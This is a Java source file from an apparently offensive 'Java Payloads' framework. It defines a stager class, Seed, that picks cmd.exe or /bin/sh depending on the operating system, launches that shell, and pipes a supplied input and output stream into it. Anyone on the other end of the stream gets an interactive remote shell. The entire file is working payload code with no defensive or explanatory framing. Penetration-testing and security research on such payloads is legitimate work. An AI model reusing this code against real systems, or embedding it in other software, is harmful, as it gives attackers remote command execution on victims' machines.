/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stager;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;

public class Seed implements Stager {
    private static final String OS_NAME_PROP = "os.name";
    private static final String OS_NAME_WIN = "windows";
    private static final String WIN_CMD = "cmd.exe";
    private static final String NIX_CMD = "/bin/sh";

    public void start(DataInputStream in, OutputStream out, String[] params)
            throws Exception {
        final String[] cmdarray = new String[1];
        if (System.getProperty(OS_NAME_PROP).toLowerCase().indexOf(OS_NAME_WIN) != -1) {
            cmdarray[0] = WIN_CMD.toLowerCase();
        } else {
            cmdarray[0] = NIX_CMD.toLowerCase();
        }
        
        initiateStreamForwarding(in, out, cmdarray);
    }

    /**
     * @param in
     * @param out
     * @param cmdarray
     * @throws IOException
     * @throws InterruptedException
     */
    private void initiateStreamForwarding(DataInputStream in, OutputStream out,
            final String[] cmdarray) throws IOException, InterruptedException {
        final Process proc = Runtime.getRuntime().exec(cmdarray);
        new StreamForwarder(in, proc.getOutputStream(), out).start();
        new StreamForwarder(proc.getInputStream(), out, out).start();
        new StreamForwarder(proc.getErrorStream(), out, out).start();
        proc.waitFor();
        in.close();
        out.close();
    }
}
